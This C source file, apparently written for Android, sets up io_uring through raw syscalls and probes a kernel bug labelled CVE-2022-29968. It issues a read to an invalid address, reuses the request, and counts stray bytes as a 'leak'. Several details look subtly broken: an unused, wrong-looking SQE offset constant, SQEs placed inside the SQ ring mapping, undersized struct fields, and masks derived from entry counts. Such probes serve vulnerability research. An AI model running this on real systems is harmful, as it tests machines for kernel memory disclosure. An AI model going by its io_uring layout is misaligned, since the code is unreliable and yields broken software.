/* io_uring_probe.c — io_uring 基础功能测试 + CVE-2022-29968 探针 */
#define __BIONIC_DEPRECATED_PAGE_SIZE_MACRO
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/mman.h>

#define IORING_OFF_SQ_RING  0ULL
#define IORING_OFF_CQ_RING  0x8000000ULL
#define IORING_OFF_SQES     0x10000ULL
#define IORING_ENTER_GETEVENTS 1

struct io_sqring_offsets {
    uint32_t head, tail, ring_mask, ring_entries, flags, dropped, array;
    uint32_t resv[3];
};
struct io_cqring_offsets {
    uint32_t head, tail, ring_mask, ring_entries, overflow, cqes, flags, resv;
};
struct io_uring_params {
    uint32_t sq_entries, cq_entries, flags, sq_thread_cpu, sq_thread_idle,
             features, wq_fd, resv[10];
    struct io_sqring_offsets sq_off;
    struct io_cqring_offsets cq_off;
};
struct io_uring_sqe {
    uint8_t opcode, flags;
    uint16_t ioprio;
    int32_t fd;
    uint64_t off, addr;
    uint32_t len;
    uint32_t op_flags;
    uint64_t user_data;
    uint16_t buf_group;
    uint8_t personality, splice_fd_in;
    uint64_t pad[2];
};
struct io_uring_cqe {
    uint64_t user_data;
    int32_t res;
    uint32_t flags;
};

static int uring_fd;
static unsigned char *sq_mmap, *cq_mmap, *sqe_mmap;
static uint32_t sq_mask, cq_mask;
static struct io_uring_sqe *sqes;
static uint32_t *sq_tail, *sq_head, *sq_array;
static uint32_t *cq_tail, *cq_head;
static struct io_uring_cqe *cqes;

int main(void) {
    setvbuf(stdout, NULL, _IONBF, 0);
    printf("=== io_uring_probe ===\n");

    struct io_uring_params p;
    memset(&p, 0, sizeof(p));
    p.sq_entries = 4;
    p.cq_entries = 8;
    errno = 0;
    uring_fd = (int)syscall(425, 4, &p);
    printf("io_uring_setup(4) → fd=%d errno=%d\n", uring_fd, errno);
    if (uring_fd < 0) return 1;
    printf("  sq_entries=%u cq_entries=%u features=0x%x\n",
           p.sq_entries, p.cq_entries, p.features);
    printf("  sq_off: head=%u tail=%u mask=%u entries=%u array=%u\n",
           p.sq_off.head, p.sq_off.tail, p.sq_off.ring_mask,
           p.sq_off.ring_entries, p.sq_off.array);
    printf("  cq_off: head=%u tail=%u mask=%u cqes=%u\n",
           p.cq_off.head, p.cq_off.tail, p.cq_off.ring_mask, p.cq_off.cqes);

    /* mmap SQ ring */
    size_t sq_sz = ((p.sq_off.array + p.sq_entries * 4 + 63) & ~63) + p.sq_entries * 64;
    sq_mmap = mmap(NULL, sq_sz, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_POPULATE,
                   uring_fd, IORING_OFF_SQ_RING);
    printf("  mmap SQ(sz=%zu) → %p errno=%d\n", sq_sz, sq_mmap, errno);
    if (sq_mmap == MAP_FAILED) return 1;

    /* mmap CQ ring */
    size_t cq_sz = p.cq_off.cqes + p.cq_entries * sizeof(struct io_uring_cqe);
    cq_mmap = mmap(NULL, cq_sz, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_POPULATE,
                   uring_fd, IORING_OFF_CQ_RING);
    printf("  mmap CQ(sz=%zu) → %p errno=%d\n", cq_sz, cq_mmap, errno);
    if (cq_mmap == MAP_FAILED) return 1;

    /* SQEs 嵌在 SQ ring mmap 里 */

    /* 设置指针 */
    sq_head = (uint32_t *)(sq_mmap + p.sq_off.head);
    sq_tail = (uint32_t *)(sq_mmap + p.sq_off.tail);
    sq_array = (uint32_t *)(sq_mmap + p.sq_off.array);
    sq_mask = p.sq_entries - 1;
    cq_head = (uint32_t *)(cq_mmap + p.cq_off.head);
    cq_tail = (uint32_t *)(cq_mmap + p.cq_off.tail);
    cq_mask = p.cq_entries - 1;
    cqes = (struct io_uring_cqe *)(cq_mmap + p.cq_off.cqes);
    { uint32_t sqe_off = (p.sq_off.array + p.sq_entries*4 + 63) & ~63;
      sqes = (struct io_uring_sqe *)(sq_mmap + sqe_off); }

    /* 准备测试文件 */
    int rfd = open("/dev/zero", O_RDONLY);
    static char rbuf[4096], rbuf2[4096];
    memset(rbuf, 0xBB, 4096);
    memset(rbuf2, 0xCC, 4096);

    /* === NOP 测试 === */
    printf("\n-- NOP --\n");
    uint32_t tail = *sq_tail;
    struct io_uring_sqe *sqe = &sqes[tail & sq_mask];
    memset(sqe, 0, sizeof(*sqe));
    sqe->opcode = 0;
    sqe->user_data = 0x1000;
    __atomic_store_n(sq_tail, tail + 1, __ATOMIC_RELEASE);
    int ret = (int)syscall(426, uring_fd, 1, 1, IORING_ENTER_GETEVENTS, NULL, 0);
    printf("  enter → %d errno=%d\n", ret, errno);
    uint32_t chead = *cq_head;
    if (chead != *cq_tail) {
        struct io_uring_cqe *c = &cqes[chead & cq_mask];
        printf("  CQE: ud=0x%llx res=%d\n", (unsigned long long)c->user_data, c->res);
        *cq_head = chead + 1;
    }

    /* === READ 测试 === */
    printf("\n-- READ(/dev/zero) --\n");
    tail = *sq_tail;
    sqe = &sqes[tail & sq_mask];
    memset(sqe, 0, sizeof(*sqe));
    sqe->opcode = 20;  /* IORING_OP_READ */
    sqe->fd = rfd;
    sqe->addr = (uint64_t)(uintptr_t)rbuf;
    sqe->len = 4096;
    sqe->user_data = 0x2000;
    __atomic_store_n(sq_tail, tail + 1, __ATOMIC_RELEASE);
    ret = (int)syscall(426, uring_fd, 1, 1, IORING_ENTER_GETEVENTS, NULL, 0);
    printf("  enter → %d errno=%d\n", ret, errno);
    chead = *cq_head;
    if (chead != *cq_tail) {
        struct io_uring_cqe *c = &cqes[chead & cq_mask];
        printf("  CQE: ud=0x%llx res=%d\n", (unsigned long long)c->user_data, c->res);
        *cq_head = chead + 1;
    }
    printf("  rbuf[0..3] = %02x %02x %02x %02x\n", rbuf[0], rbuf[1], rbuf[2], rbuf[3]);

    /* === CVE-2022-29968: 非法地址 READ === */
    printf("\n-- CVE-2022-29968: 非法地址 --\n");
    tail = *sq_tail;
    sqe = &sqes[tail & sq_mask];
    memset(sqe, 0, sizeof(*sqe));
    sqe->opcode = 20;
    sqe->fd = rfd;
    sqe->addr = 0xDEADBEEF000ULL;
    sqe->len = 4096;
    sqe->user_data = 0x3000;
    __atomic_store_n(sq_tail, tail + 1, __ATOMIC_RELEASE);
    ret = (int)syscall(426, uring_fd, 1, 1, IORING_ENTER_GETEVENTS, NULL, 0);
    printf("  enter → %d errno=%d\n", ret, errno);
    chead = *cq_head;
    if (chead != *cq_tail) {
        struct io_uring_cqe *c = &cqes[chead & cq_mask];
        printf("  CQE: ud=0x%llx res=%d\n", (unsigned long long)c->user_data, c->res);
        *cq_head = chead + 1;
    }

    /* === 复用 io_kiocb: 合法 READ === */
    printf("\n-- 复用 io_kiocb --\n");
    tail = *sq_tail;
    sqe = &sqes[tail & sq_mask];
    memset(sqe, 0, sizeof(*sqe));
    sqe->opcode = 20;
    sqe->fd = rfd;
    sqe->addr = (uint64_t)(uintptr_t)rbuf2;
    sqe->len = 4096;
    sqe->user_data = 0x4000;
    __atomic_store_n(sq_tail, tail + 1, __ATOMIC_RELEASE);
    ret = (int)syscall(426, uring_fd, 1, 1, IORING_ENTER_GETEVENTS, NULL, 0);
    printf("  enter → %d errno=%d\n", ret, errno);
    chead = *cq_head;
    if (chead != *cq_tail) {
        struct io_uring_cqe *c = &cqes[chead & cq_mask];
        printf("  CQE: ud=0x%llx res=%d\n", (unsigned long long)c->user_data, c->res);
        *cq_head = chead + 1;
    }
    int leak = 0;
    for (int i = 0; i < 64; i++)
        if (rbuf2[i] != 0x00 && rbuf2[i] != 0xCC) leak++;
    printf("  rbuf2 异常字节: %d %s\n", leak, leak > 8 ? "★ 泄漏!" : "(正常)");

    printf("\n=== 完成 ===\n");
    close(rfd);
    close(uring_fd);
    return 0;
}
